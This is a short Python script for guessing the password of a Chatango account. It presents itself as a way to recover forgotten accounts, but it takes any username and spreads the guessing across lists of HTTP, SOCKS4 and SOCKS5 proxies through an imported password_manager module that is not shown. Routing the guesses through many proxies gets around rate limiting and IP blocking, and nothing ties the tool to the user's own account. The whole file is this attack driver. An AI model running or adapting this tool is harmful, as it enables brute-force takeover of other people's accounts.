#!/usr/bin/python
# Created May 17, 2016
# Purpose: Used to guess a chatango password, in an attempt to restore accounts you've forgotten the password to

import password_manager
import sys

# proxy:port separated by newlines
httpproxies = open('httpproxies').read().splitlines()
socks4proxies = open('socks4proxies').read().splitlines()
socks5proxies = open('socks5proxies').read().splitlines()

if len(sys.argv) != 2:
    print 'python %s username' % sys.argv[0]
    exit()

username = sys.argv[1].lower()

attempts = open('ATTEMPTED').read().splitlines()
if username in attempts:
    print 'Username has already been attempted'
    exit()

with open('ATTEMPTED', 'a+') as f:
    f.write(username + '\n')

pm = password_manager.PasswordManager(username)

for proxy in httpproxies:
    p = proxy.split(':')
    ip = p[0]
    port = p[1]
    pm.add_worker(ip, port, password_manager.PROXY_HTTP)

for proxy in socks4proxies:
    p = proxy.split(':')
    ip = p[0]
    port = p[1]
    pm.add_worker(ip, port, password_manager.PROXY_SOCKS4)

for proxy in socks5proxies:
    p = proxy.split(':')
    ip = p[0]
    port = p[1]
    pm.add_worker(ip, port, password_manager.PROXY_SOCKS5)

pm.start()
